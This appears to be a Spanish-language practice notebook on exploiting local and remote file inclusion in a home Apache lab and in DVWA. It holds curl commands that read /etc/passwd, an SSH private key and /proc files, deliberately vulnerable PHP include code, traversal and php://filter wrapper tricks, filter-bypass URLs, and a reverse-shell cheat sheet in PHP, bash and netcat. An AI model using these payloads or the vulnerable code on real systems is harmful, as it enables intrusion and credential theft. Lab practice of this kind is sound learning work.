# _test_LFI-RFI_

# _practica de hackinWeb jugando con LFI/RFI de forma remota o local_


    "PRACTICA LOCAL"
    #################################
    #       PRACTICA LFI		#
    #################################

        NOS DIRIGIMOS A NUESTRO DIRECTORIO DE TRABAJO

    #cd /var/www/html


        ACTIVAMOS EL EL SERVICIO "APACHE2"
    ┌──(josema96㉿kali)-[~]
    └─$ sudo service apache2 start

        COMFIRMAMOS SI ESTA ACTIVADO EL "APACHE2"
    ┌──(josema96㉿kali)-[/var/www/html]
    └─$ sudo lsof -i:80
    apache2 xxxx www-data  xx  IPv6 xxxxxxx  0t0  TCP *:http (LISTEN) #PERFECTO EL "APACHE2 ESTA EN ESCUCHA"


    CREAMOS UN SCRIPT EN PHP #===con el editor nano===#
            test.txt
    ============se tensa que te cagas #...# hola esto es una prueba de "LFI" CON JOSEMA=============

    ***************************************************************************************************************************
      UNA VES CREADA VAMOS A INTENTAR CARGAR EL ARCHIVO EN NUESTRO "LOCALHOSTS" DONDE ESTA ESCUCHANDO "APACHE2"

    http://localhost/example.php?FILE=test.txt
    ============se tensa que te cagas #...# hola esto es una prueba de "LFI" CON JOSEMA=============
    ***************************************************************************************************************************
    http://localhost/example.php?FILE=/etc/group
    http://localhost/example.php?FILE=/etc/passwd

    #con "curl" podemos ver algo mas relevante

    #enumerar usuario valido=existente
    curl -s "http://localhost/example.php?FILE=/etc/passwd" | grep "sh$"

    #listar "id_rsa"
    curl -s http://localhost/test.php?page=../../../home/josema96/.ssh/id_rsa/

    #ENUMERAR SISTEMA
    http://localhost/example.php?FILE=/proc/sched_debug

    #creamos un archivo
      sudo nano encuentrame.sh
    #!/bin/bash
    sleep 100

    la ejecutamos

    #sudo chmod +x encuentrame.sh
    /var/www/html  ./encuentrame.sh

    #podemos ver en “proc/sched_debug” lo que se esta ejecutando hay como atacante podes ejecutar una “
    http://localhost/example.php?FILE=/proc/net/fib_trie
    #vemos montones de direccion “IP”
    sudo curl -s "http://localhost/example.php?FILE=/proc/net/fib_trie"
    #enumeramos a ver q interfaces de red tiene o “IP” ETC:
    #vamos filtrar por has local:
    sudo curl -s "http://localhost/example.php?FILE=/proc/net/fib_trie" | grep -i "host local"

    sudo curl -s "http://localhost/example.php?FILE=/proc/net/fib_trie" | grep -i "host local" -B 1

    #expreciones reguleres filtremos con la “IP” en dijitos
    sudo curl -s "http://localhost/example.php?FILE=/proc/net/fib_trie" | grep -i "host local" -B
      1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}'

    #SACAMOS LO QUE SE REPITE
    sudo curl -s "http://localhost/example.php?FILE=/proc/net/fib_trie" | grep -i "host local" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u


    #ip interna de la maquina
    /var/www/html  iwconfig | awk '{print $1}'

    /var/www/html  iwconfig 21 | awk '{print $1}'

    /var/www/html  iwconfig 21 | awk '{print $1}' | sed '/^\s*$/d'

    #aora vemos las interfaces de red
    /var/www/html  ifconfig

    #otra cosa que podemos ver en ‘LFI’
    http://localhost/example.php?FILE=/proc/net/tcp
    #lo podemos hacer con “CURL”
    /var/www/html  sudo curl -s "http://localhost/example.php?FILE=/proc/net/tcp"

    sudo curl -s "http://localhost/example.php?FILE=/proc/net/tcp" | awk '{print $2}'

    sudo curl -s "http://localhost/example.php?FILE=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address"

    sudo curl -s "http://localhost/example.php?FILE=/proc/net/tcp" | awk '{print $2}' | grep -v
    "local_address" | awk '{print $2}' FS=":"

    sudo curl -s "http://localhost/example.php?FILE=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u

    #vemos que es un puerto corriendo en el servidor

    $:sudo python
      Type "help", "copyright", "credits" or "license" for more information.
      0xA992
      43410
    sudo for port in $(curl -s "http://localhost/example.php?FILE=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do echo "contenido: $port"; done
    el contenido: A992
    el contenido: D8FE

    sudo for port in $(curl -s "http://localhost/example.php?FILE=/proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do echo "[$port] --&gt; Puerto $(echo "ibase=16; $port")"; done
    [A992] → Puerto 43410
    [D8FE] - Puerto 55550



    #lo de arriba son los puertos q estan activas en el servidor posemos ver que hay en el puerto de cada uno, un ejemplo seria

    sudo lsof -i:80
    apache2 1853 root 4u IPv6 26626
    0t0 TCP *:http (LISTEN)

    #otro ejemplo creamos un archivo example2.php
    GNU nano 5.4		example2.php
    ?php
      $filename = $_GET['file'];
      include("/var/www/html/" . $filename);
    ?

    #lo subimos en el servidor

    http://localhost/example2.php?file=/etc/passwd
    #no me lo lista nada lo que pasa es que /var/www/html/
    #"esto no es un directorio"

    /etc/passwd

    lo que hay que hacer es retroceder tantas rutas hacia atras cuando queramos ejemplo:::
    /var/www/html/../../../../../etc/passwd
    #SE CONOCE COMO “Directory Traversal"

    GNU nano 5.4			example2.php
    ?php
      $filename = $_GET['file'];	
      include("/var/www/html/" . $filename);  // /var/www/html//etc/passwd
    // /var/www/html/../../../../../etc/passwd =Directory Traversal
    ?
    view-source:
    http://localhost/example2.php?file=../../../../../etc/passwd
    root:x:0:0:root:/root:/usr/bin/zsh

    #HAY LA TENEMOS
    #existe un monton de tecnica para sanear o bypass restricciones
    #vamos a ver la parte de los Wrappers=Envoltorios
    #IMAGINAMOS QUE NO PODEDEMOS ACCEDER A http://localhost/example2.php?file=../../../../../etc/passwd Y NO
    #SE NOS LISTA
    #SIENDO ASI VULN A “LFI”


    HAY ES DONDE ENTRA LOS Wrappers
    view-source:http://localhost/example2.php?file=file://../../../../../etc/passwd

    otra forma de hacer es lo sgtes:

    view-source:http://localhost/example2.php?file=file:///etc/passwd
    view-source:http://localhost/example.php?FILE=file:///etc/group
    view-source:http://localhost/example.php?FILE=file:///proc/sched_debug

    vamos a ver encodificacion en base64 con Wrappers


    creamos un archivo example3.php
    GNU nano 5.4			example3.php
    ?php
      system( 'whoami' ); //esto es un nivel de scriptkiddie y mas una prueba
    ?

    view-source:http://localhost/example.php?FILE=example3.php
    www-data

    nos esta ejecutando como usuario del sistema

       /var/www/html  sudo lsof -i:80			 ✔  1m 41s   22:50:32
    COMMAND PID	USER FD TYPE DEVICE SIZE/OFF NODE NAME
    COMMAND PID
    USER FD TYPE DEVICE SIZE/OFF NODE NAME


    #Para ver el contenido del archivo a nivel de php
    view-source:http://localhost/example.php?FILE=php://filter/convert.base64-encode/resource=example3.php
    PD9waHAKCQlzeXN0ZW0oICd3aG9hbWknICk7IC8vZXN0byBlcyAgdW4gbml2ZWwgZGUgc2NyaXB0a2lkZGllIHkgbWFz
    #Aora deco en base64 en la terminal



    #############################################################################

    #1) DVWA : File Inclusion Attack – Low
      .RFI

      Low File Inclusion Source

      <?php

      // The page we wish to display
      $file = $_GET[ 'page' ];

      ?>

    *Para un ataque de RFI, puede colocar fácilmente una URL de sitio web diferente después de 'page =' 
    en la URL. Al igual que en la imagen a continuación, puede ver que la nueva página se carga 
    si cambia la última parte de la URL a 'page = https: //google.com'.*

    #http://localhost/vulnerabilities/fi/?page=https://google.com


      si es vulnerable a "RFI" entonces facilmente cargaria el servidor de >==google.com==<

    Lo que significa que si tiene un archivo php malicioso, puede poner la ruta del archivo en la URL y cargarlo en la página.
    Puede crear fácilmente un archivo php malicioso (enlazar o revertir el shell) y cargar ese archivo desde el navegador web de la víctima

    #reverse shell
    #cheat sheet =======> "php","bash","netcat" hay mucho mas pero dejo tres que son fundamental saber

      ."php"
      php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

      ."bash"
      bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

      ."netcat"
      1= nc -e /bin/sh 10.0.0.1 1234
      2= rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f


    #2) DVWA : File Inclusion Attack – Medium

      Medium File Inclusion Source

      <?php

      // The page we wish to display
      $file = $_GET[ 'page' ];

      // Input validation
      $file = str_replace( array( "http://", "https://" ), "", $file );
      $file = str_replace( array( "../", "..\"" ), "", $file );

      ?>
    La diferencia entre el nivel bajo y el nivel medio es que existe una validación de entrada, que simplemente
    bloquea http: // y https: //. Esta validación de entrada se puede aprovechar usando minúsculas y mayúsculas
    o escribiendo más palabras. p.ej. HtTp: //, hhttp: // ttp: //


      $file = str_replace( array( "http://", "https://" ), "", $file );


    Para RFI, esto se puede aprovechar fácilmente mediante el uso de 'Https' o 'HTTPS'
    (por ejemplo, http://localhost/vulnerabilities/fi/?page=hTtPs://google.com)

    #http://localhost/vulnerabilities/fi/?page=HttpS://google.com

    #http://localhost/vulnerabilities/fi/?page=htTps://google.com

    #http://localhost/vulnerabilities/fi/?page=HTTPS://google.com

